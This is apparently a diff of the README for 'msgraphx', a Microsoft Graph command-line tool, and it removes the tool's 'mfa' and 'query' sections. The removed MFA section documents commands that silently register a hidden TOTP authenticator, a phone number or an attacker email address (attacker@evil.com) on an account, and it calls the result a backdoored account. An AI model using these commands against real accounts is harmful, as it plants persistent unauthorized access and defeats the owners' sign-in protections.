@@ -343,7 +343,7 @@ msgraphx aad group <group-object-id>
 
 ### pim
 
-List Privileged Identity Management role assignments via `api.azrbac.mspim.azure.com`.
+List Privileged Identity Management role assignments. Requires `RoleManagement.Read.Directory`.
 
 ```bash
 msgraphx aad pim
@@ -515,93 +515,3 @@ Flags: `--path PATH` (file or folder in OneDrive; omit for full dump), `--no-res
 
 `me onedrive` is an alias for `me drive`.
 
----
-
-## mfa
-
-Manipulate MFA security info via `mysignins.microsoft.com`. Requires a **separate token** scoped to resource `19db86c3-b2b9-44cc-b339-36da233a3be2` (the My Sign-Ins portal), not the Graph API token. Pass it with `--mfa-token`.
-
-### available
-
-List registered MFA methods and what can be added.
-
-```bash
-msgraphx mfa --mfa-token <token> available
-```
-
-### add-otp
-
-Register a hidden TOTP authenticator. Auto-verifies and prints the secret key.
-
-```bash
-msgraphx mfa --mfa-token <token> add-otp
-```
-
-Store the printed secret in any authenticator app to generate codes for the backdoored account.
-
-### add-phone
-
-Register a phone number as SMS or call-based MFA.
-
-```bash
-msgraphx mfa --mfa-token <token> add-phone --number 5551234567
-msgraphx mfa --mfa-token <token> add-phone --number 5551234567 --country 44 --type call
-```
-
-Flags: `--number DIGITS` (required), `--country CODE` (default: `1`), `--type sms|call` (default: `sms`).
-
-### add-email
-
-Register an email address as MFA.
-
-```bash
-msgraphx mfa --mfa-token <token> add-email --email attacker@evil.com
-```
-
-### verify
-
-Verify a pending method addition.
-
-```bash
-msgraphx mfa --mfa-token <token> verify --type <int> --data <data>
-msgraphx mfa --mfa-token <token> verify --type <int> --context <ctx> --data <data>
-```
-
-### delete
-
-Delete a registered MFA method.
-
-```bash
-msgraphx mfa --mfa-token <token> delete --type <int> --data '<json>'
-```
-
----
-
-## query
-
-Call any Graph API endpoint directly. Useful for prototyping or accessing endpoints not covered by a dedicated module. `query` is also the default subcommand: bare paths are routed to it automatically.
-
-```bash
-# implicit (no subcommand name needed)
-msgraphx /me
-msgraphx /users
-msgraphx /me/messages
-
-# explicit
-msgraphx query /me/drive/root/children
-
-# OData options
-msgraphx query /users --filter "department eq 'IT'" --select id,displayName,mail
-msgraphx query /groups --top 999 --paginate
-
-# beta endpoint
-msgraphx query /me/drive/root/children --beta
-
-# POST with JSON body
-msgraphx query /me/sendMail --method POST --body '{"message": {...}}'
-
-# read body from stdin
-cat payload.json | msgraphx query /search/query --method POST --body -
-```
-
-Flags: `--method GET|POST|PATCH|PUT|DELETE`, `--filter ODATA`, `--select FIELDS`, `--top N`, `--paginate`, `--beta`, `--body JSON|-`.
